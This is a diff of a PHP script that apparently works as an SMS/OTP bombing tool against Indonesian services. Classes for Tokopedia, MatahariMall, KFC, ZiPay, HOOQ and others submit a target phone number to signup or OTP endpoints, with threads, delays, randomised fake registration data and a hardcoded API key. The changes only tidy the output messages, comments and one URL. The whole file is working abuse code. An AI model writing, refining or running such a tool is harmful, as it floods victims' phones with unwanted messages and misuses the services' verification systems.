@@ -1,9 +1,6 @@
 <?php
 error_reporting(0);
 
-$success = "successfully sent!";
-$failure = "failed to send";
-
 /* Tokopedia */
 
 class tokopedia{
@@ -56,9 +53,9 @@ class tokopedia{
 		$send = $this->sendC($url, null, $data);
 		// echo $send;
 		if (preg_match('/otp_attempt_left/', $send)) {
-			print($success);
+			print("successfully sent!\n");
 		} else {
-			print($failure);
+			print("failed to send\n");
 		}
 	}
 }
@@ -108,9 +105,9 @@ class phd{
 		$data = "phone_number={$target}";
 		$send = $this->sendC($url, null, $data);
 		if (preg_match('/We have sent an OTP to your phone, Please enter the 4 digit code./', $send)) {
-			print($success);
+			print("successfully sent!\n");
 		} else {
-			print($failure);
+			print("failed to send\n");
 		}
 	}
 }
@@ -175,14 +172,14 @@ class mataharimall {
     $data = "phone_number={$target}";
     $send = $this->sendC($url, null, $data);
     if (preg_match('/Kode OTP berhasil dikirim/', $send)) {
-      print($success);
+      print("successfully sent!\n");
     } else {
-      print($failure);
+      print("failed to send\n");
     }
   }
 }
 
-/* Jd.id */
+/* JD.id */
 
 function jdid($target, $thread, $delays){
   $x = 0;
@@ -288,12 +285,12 @@ class kfc{
     $data = "fullname=makan+ayam&handphone={$target}&email={$this->numeric()}{$this->alpha()}%40gmail.com&password={$this->numeric()}{$this->alpha()}&confirm_password={$this->numeric()}{$this->alpha()}&language_id=ID&X-API-KEY=563f204a20876f1fa0b20523bdfd0728";
     $send = $this->sendC($url, null, $data);
     if (preg_match('/Invalid Handphone Number!/', $send)) {
-      print($success);
+      print("successfully sent!\n");
       flush();
       ob_flush();
       sleep(1);
     } else {
-      print($failure);
+      print("failed to send\n");
       flush();
       ob_flush();
       sleep(1);
@@ -301,7 +298,7 @@ class kfc{
   }
 }
 
-/* ZiPay */
+/* ZiPAY */
 
 class zipay{
 	public $target;
@@ -337,17 +334,17 @@ class zipay{
 	}
 
 	public function Verif(){
-		$url = "https://id.zipay.im/invite/signup_sms.aspx";
+		$url = "https://zipay.id/invite/signup_sms.aspx";
 		$target = $this->target;
 		$data = "receiver={$target}";
 		$send = $this->sendC($url, null, $data);
 		if (preg_match('/true/', $send)) {
-			print($success);
+			print("successfully sent!\n");
 			flush();
 			ob_flush();
 			sleep(1);
 		} else {
-			print($failure);
+			print("failed to send\n");
 			flush();
 			ob_flush();
 			sleep(1);
@@ -411,12 +408,12 @@ class whiskas{
     $send = $this->sendC($url, null, $data);
     echo $send;die;
     if (preg_match('/mobileNumber/', $send)) {
-      print($success);
+      print("successfully sent!\n");
       flush();
       ob_flush();
       sleep(61);
     } else {
-      print($failure);
+      print("failed to send\n");
       flush();
       ob_flush();
       sleep(61);
@@ -424,7 +421,7 @@ class whiskas{
   }
 }
 
-/* Hooq */
+/* HOOQ */
 
 class hooq{
   public $target;
@@ -476,12 +473,12 @@ class hooq{
     $data = "_csrf={$key}&device_id=56ad6be9-cd02-{$this->numeric()}-{$this->numeric()}-d4f2435ef6e8&country_code=%2B62&mobile={$target}";
     $send = $this->sendC($url, null, $data);
     if (preg_match('/SMS Kode Verifikasi Kamu sudah terkirim ke/', $send)) {
-      print($success);
+      print("successfully sent!\n");
       flush();
       ob_flush();
       sleep(1);
     } else {
-      print($failure);
+      print("failed to send\n");
       flush();
       ob_flush();
       sleep(1);
